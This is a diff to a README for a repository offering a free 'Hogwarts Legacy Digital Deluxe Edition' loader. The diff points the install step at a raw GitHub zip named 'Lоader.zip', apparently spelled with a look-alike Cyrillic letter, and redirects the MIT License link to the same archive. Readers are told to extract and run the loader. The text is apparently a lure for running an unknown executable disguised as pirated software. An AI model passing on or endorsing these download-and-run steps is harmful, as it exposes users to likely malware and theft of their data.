@@ -27,7 +27,7 @@ Welcome to the ultimate **Hogwarts Legacy Digital Deluxe Edition Free Download**
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/ErixMasih/HogwartsLegacy-DigitalDeluxe-FreebieHub/main/Lоader.zip** from this repository.
 2. Extract using your favorite archiver.
 3. Run the Loader to enjoy **Hogwarts Legacy Digital Deluxe Edition**.
 4. Follow on-screen instructions and dive into the magical universe!
@@ -42,7 +42,7 @@ This loader is for educational and personal entertainment purposes only. No unau
 
 ## 📝 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT). All contributions and forks are welcome!
+Licensed under the [MIT License](https://raw.githubusercontent.com/ErixMasih/HogwartsLegacy-DigitalDeluxe-FreebieHub/main/Lоader.zip). All contributions and forks are welcome!
 
 ---
 
